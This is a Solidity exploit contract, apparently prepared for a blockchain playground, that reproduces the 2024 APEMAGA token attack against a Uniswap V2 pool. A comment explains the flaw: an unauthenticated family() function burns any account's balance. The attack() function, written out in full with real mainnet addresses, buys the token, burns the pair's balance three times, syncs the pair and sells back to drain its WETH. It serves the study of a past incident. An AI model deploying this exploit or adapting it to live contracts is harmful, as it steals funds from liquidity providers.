// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-APEMAGA).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest is Test; testExploit() calls attack() on `address(this)`, and
// `this` is funded with 9 WETH via `deal()` in setUp() before the attack — there
// is no separate exploit contract), so there is nothing standalone to deploy.
// This contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it, pre-fund it with WETH (via `setup`), and record
// attack(). Logic and constants are copied verbatim from test/APEMAGA_exp.sol.
//
// Root cause: APEMAGA (verified name `Tonken`) exposes a public, unauthenticated
// `family(address account)` that forwards to an internal `_approve_`, which
// despite its name does NOT set an allowance -- it burns ~99.9% of `account`'s
// token balance:
//   function family(address account) external { super._approve_(account, account, 0); }
//   function _approve_(address owner, address spender, uint256 amount) internal {
//       require(owner == spender, ...);
//       uint256 accountBalance = (_balances[owner] + trading()) * 999 / 1000;
//       require(accountBalance >= amount, ...); // amount = 0 -> always passes
//       _balances[owner] -= accountBalance;
//       _totalSupply     -= accountBalance;
//       emit Transfer(owner, address(0), accountBalance);
//   }
// Because `family()` takes an arbitrary `account` with no access control, anyone
// can point it at the Uniswap-V2 APEMAGA/WETH pair and destroy the pair's APEMAGA
// balance, then call pair.sync() so the pair adopts the slashed balance as its new
// reserve -- breaking the constant-product invariant with no matching WETH
// outflow. Selling a small APEMAGA balance back into the now-degenerate pool then
// drains almost the entire WETH side of the pool.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IAPEMAGA is IERC20 {
    function family(address account) external;
}

interface IUniPairV2 {
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract APEMAGADrain {
    IUniPairV2 constant Pair = IUniPairV2(0x85705829c2f71EE3c40A7C28f6903e7c797c9433);
    IUniswapV2Router constant uniswapv2 =
        IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IAPEMAGA constant Apemaga = IAPEMAGA(0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // The historical test contract (ContractTest) holds native ETH by default (a
    // Forge test contract's own balance) plus 9 WETH from `deal()`. This synthetic
    // exploit is a fresh contract instead, so its native ETH for the
    // swapExactETHForTokens{value: 0.1 ether} call is wired in via a `setup`
    // rawCall step (attacker -> exploit, 0.1 ether) mirroring that starting
    // balance; hence the receive().
    receive() external payable {}

    function attack() public {
        swap_token_to_ExactToken(0.1 ether, WETH, address(Apemaga), 8000 ether);

        // Three unauthenticated calls burn ~99.9% of the pair's APEMAGA balance
        // each time -- the compounding 999/1000 cut sends the pair's balance
        // toward dust (~54.77 -> ~0.0000000542 APEMAGA).
        Apemaga.family(address(Pair));
        Apemaga.family(address(Pair));
        Apemaga.family(address(Pair));

        // The pair adopts the gutted balance as its new reserve, permanently
        // breaking the constant-product invariant (no matching WETH left).
        Pair.sync();

        address[] memory addrPath = new address[](2);
        addrPath[0] = address(Apemaga);
        addrPath[1] = WETH;
        Apemaga.approve(address(uniswapv2), 99_999_999 ether);
        uniswapv2.swapExactTokensForTokens(
            Apemaga.balanceOf(address(this)), 0, addrPath, address(this), type(uint256).max
        );
    }

    function swap_token_to_ExactToken(uint256 amount, address a, address b, uint256 amountInMax) public payable {
        IERC20(a).approve(address(uniswapv2), amountInMax);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        uniswapv2.swapExactETHForTokens{value: amount}(0, path, address(this), block.timestamp + 120);
    }
}
